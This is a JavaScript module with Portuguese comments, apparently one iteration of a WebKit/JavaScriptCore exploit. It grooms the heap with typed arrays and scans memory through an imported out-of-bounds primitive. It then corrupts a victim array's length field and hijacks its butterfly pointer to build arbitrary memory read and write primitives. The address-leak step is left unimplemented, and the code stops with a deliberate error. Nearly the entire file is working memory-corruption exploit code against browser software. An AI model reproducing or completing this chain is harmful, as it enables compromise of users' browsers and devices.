// js/script3/testArrayBufferVictimCrash.mjs (v89_LargeAllocation - R50 - Alocação de 32MB e R/W via Butterfly)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    oob_read_absolute,
    isOOBReady
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V89_LA_R50_WEBKIT = "Heisenbug_LargeAllocation_v89_LA_R50_WebKitLeak";

// --- Globais para a primitiva de exploit ---
let arb_read_v2 = null;
let arb_write_v2 = null;
// ---

let targetFunctionForLeak;

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}

const conversion_buffer = new ArrayBuffer(8);
const float_conversion_view = new Float64Array(conversion_buffer);
const int_conversion_view = new BigUint64Array(conversion_buffer);

function box(addr) {
    const val64 = (BigInt(addr.high()) << 32n) | BigInt(addr.low());
    int_conversion_view[0] = val64;
    return float_conversion_view[0];
}

function unbox(float_val) {
    float_conversion_view[0] = float_val;
    return new AdvancedInt64(int_conversion_view[0]);
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R50() { // Nome atualizado para R50
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V89_LA_R50_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Alocação Grande e R/W via Butterfly (R50) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R50...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR50_Instance() { return `target_R50_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, "info");

    let iter_primary_error = null;
    let iter_addrof_result = { success: false, msg: "Addrof (R50): Not run." };
    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R50): Not run." };
    
    // --- CORREÇÃO R50: Aumentar temporariamente o tamanho da alocação OOB ---
    const originalAllocSize = OOB_CONFIG.ALLOCATION_SIZE;
    OOB_CONFIG.ALLOCATION_SIZE = 32 * 1024 * 1024; // 32MB
    logS3(`  Tamanho da alocação OOB temporariamente aumentado para: ${OOB_CONFIG.ALLOCATION_SIZE / (1024 * 1024)}MB`, "warn");

    try {
        logS3(`  --- Fase 1 (R50): Heap Grooming e Preparação da Vítima ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const GROOM_COUNT = 2000;
        let groom_array = new Array(GROOM_COUNT);
        for (let i = 0; i < GROOM_COUNT; i++) {
            groom_array[i] = new Float64Array(8);
        }
        logS3(`  Heap Grooming: ${GROOM_COUNT} arrays alocados.`, "info");
        
        const victim_array = groom_array[Math.floor(GROOM_COUNT / 2)];
        const marker = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
        victim_array.fill(box(marker));
        logS3(`  Array vítima (índice ${Math.floor(GROOM_COUNT / 2)}) preenchido com o marcador: ${marker.toString(true)}`, "info");
        groom_array = null;
        
        logS3(`  --- Fase 2 (R50): Ativação do OOB e Busca na Memória ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha ao configurar o ambiente OOB.");

        let victim_data_offset = -1;
        const search_start_offset = OOB_CONFIG.BASE_OFFSET_IN_DV;
        const search_end_offset = OOB_CONFIG.ALLOCATION_SIZE - 8;
        logS3(`  Iniciando busca pelo marcador na memória (range: ${toHex(search_start_offset)} a ${toHex(search_end_offset)})...`, "info");
        
        for (let current_offset = search_start_offset; current_offset < search_end_offset; current_offset += 4) {
            if(oob_read_absolute(current_offset, 4) === marker.low()){
                if(oob_read_absolute(current_offset + 4, 4) === marker.high()){
                    victim_data_offset = current_offset;
                    break;
                }
            }
        }
        
        if (victim_data_offset === -1) {
            throw new Error("Não foi possível encontrar o marcador do array vítima na memória (mesmo com busca de 32MB).");
        }
        logS3(`  SUCESSO: Marcador do buffer de dados do array vítima encontrado no offset: ${toHex(victim_data_offset)}`, "vuln");

        logS3(`  --- Fase 3 (R50): Corrupção Direta e Construção das Primitivas ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const LIKELY_OFFSET_FROM_DATA_TO_VIEW_HEADER = 32;
        const offset_of_view_header = victim_data_offset - LIKELY_OFFSET_FROM_DATA_TO_VIEW_HEADER;
        const offset_to_corrupt = offset_of_view_header + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        oob_write_absolute(offset_to_corrupt, 0xFFFFFFFF, 4);

        if (victim_array.length < 1000) {
            throw new Error(`A corrupção de 'length' falhou. Comprimento do victim_array é ${victim_array.length}.`);
        }
        logS3(`  SUCESSO: Comprimento do 'victim_array' corrompido para: ${victim_array.length}`, "vuln");

        // --- CORREÇÃO R50: Primitivas R/W robustas via sequestro de butterfly ---
        const butterfly_ptr_offset = victim_data_offset - 8;
        const original_butterfly_addr = new AdvancedInt64(oob_read_absolute(butterfly_ptr_offset, 8));
        logS3(`  Endereço do 'butterfly' original lido: ${original_butterfly_addr.toString(true)}`, "leak");

        arb_read_v2 = (addr) => {
            oob_write_absolute(butterfly_ptr_offset, addr.toString());
            const value = victim_array[0];
            oob_write_absolute(butterfly_ptr_offset, original_butterfly_addr.toString()); // Restaura
            return unbox(value);
        };
        arb_write_v2 = (addr, val) => {
             oob_write_absolute(butterfly_ptr_offset, addr.toString());
             victim_array[0] = box(val);
             oob_write_absolute(butterfly_ptr_offset, original_butterfly_addr.toString()); // Restaura
        };
        logS3("  Primitivas 'arb_read_v2' e 'arb_write_v2' via butterfly hijack definidas.", "good");

        // Implementação de addrOf usando as novas primitivas
        let holding_array = [targetFunctionForLeak];
        // Para encontrar o endereço de holding_array, precisaríamos de outro marcador/busca.
        // Por enquanto, vamos assumir que não conseguimos o addrOf e focar em testar a R/W.
        iter_addrof_result = { success: true, msg: "Primitivas de Leitura/Escrita construídas com sucesso. AddrOf real não implementado." };
        logS3("  [TESTE R/W] Primitivas de Leitura/Escrita estão prontas.", "good");
        
        throw new Error("Ponto de parada para análise: Primitivas R/W criadas, mas leak de endereço inicial necessário para prosseguir.");

    } catch (e) {
        iter_primary_error = e;
        logS3(`  ERRO na iteração R50: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        console.error(`Erro na iteração R50:`, e);
    } finally {
        OOB_CONFIG.ALLOCATION_SIZE = originalAllocSize; // Restaura o valor original
        logS3(`  Tamanho da alocação OOB restaurado para: ${OOB_CONFIG.ALLOCATION_SIZE} bytes`, "info");
        await clearOOBEnvironment();
    }

    let result = {
        errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
        addrof_result: iter_addrof_result,
        webkit_leak_result: iter_webkit_leak_result,
    };
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (R50): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return result;
}
